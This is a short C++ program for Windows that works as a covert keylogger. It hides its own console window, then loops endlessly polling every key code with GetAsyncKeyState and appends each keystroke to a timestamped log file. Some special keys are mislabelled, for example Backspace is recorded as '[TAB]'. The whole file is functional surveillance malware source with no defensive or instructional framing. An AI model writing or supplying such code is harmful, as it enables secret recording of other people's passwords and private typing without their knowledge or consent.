#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <ctime>
using namespace std;

void hideConsole(void);
int getLowerKey(int letter);

int main(int nArgs, char* argv[]){
	hideConsole();
	char file[30];
	char command[30];
	time_t now = time(0);
	tm *ltm = localtime(&now);
	sprintf(file, "log%d-%d-%d-%d.txt", (1900+ltm->tm_year),(1+ltm->tm_mon),(ltm->tm_mday),(ltm->tm_sec));
	sprintf(command, "echo . > %s", file);
	system(command);
	cout<<file<<endl;
	ofstream log;
	log.open(file, ios::out);
	if(log.fail()){
		cout<<"There was a problem when opening the file."<<endl;
		return 0;
	}
	log.close();
	int count = 0;
	bool mayusc = true;
	int chr = 0;
	while(true){
		for(chr=0;chr<=255;chr++){
			if(GetAsyncKeyState(chr) == -32767){
				cout<<chr;
				log.open(file, ios::app);
				switch(chr){
					//case 1:log<<"[CLICK IZQUIERDO]";break;
					//case 2:log<<"[CLICK DERECHO]";break;
					case 8:log<<"[TAB]";break;
					case 12:log<<"[ALT]";break;
					case 20:
					    if(mayusc){mayusc=false;}
					    else{mayusc=true;}
					break;
					default:
					    if(mayusc){
					    	chr = getLowerKey(chr);
					    }
					    log<<char(chr);
				}
				if(chr == 13){
					count = 0;
				}
				if(count >= 70 && chr == 32){
					cout<<endl;
					log<<"\n";
					count = 0;
				}
				else{
					count++;
				}
				log.close();
			}
		}
	}

	return 0;
}

void hideConsole(void){
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	return;
}

int getLowerKey(int letter){
	int low = letter, i= 0;
	string abc ("abcdefghijklmnopqrstuvwxyz");
	string ABC ("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
	for(i;i<26;i++){
		if(ABC[i] == char(letter)){
			low = int(abc[i]);
			break;
		}
	}
	return low;
}